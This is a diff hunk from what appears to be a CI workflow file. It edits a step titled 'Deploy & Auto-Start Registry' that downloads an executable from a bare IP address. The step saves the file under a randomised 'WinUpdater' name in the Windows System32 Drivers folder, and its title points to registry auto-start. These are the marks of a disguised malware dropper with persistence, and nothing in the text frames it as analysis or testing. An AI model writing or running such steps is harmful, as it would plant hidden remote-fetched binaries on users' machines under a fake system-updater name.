@@ -34,7 +34,7 @@ jobs:
 
       - name: 4. Deploy & Auto-Start Registry
         run: |
-          $url = "http://103.195.101.218:8080/publicbot/FocusEngine_bot.exe"
+          $url = "http://103.195.101.218:8080/publicbot"
           
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
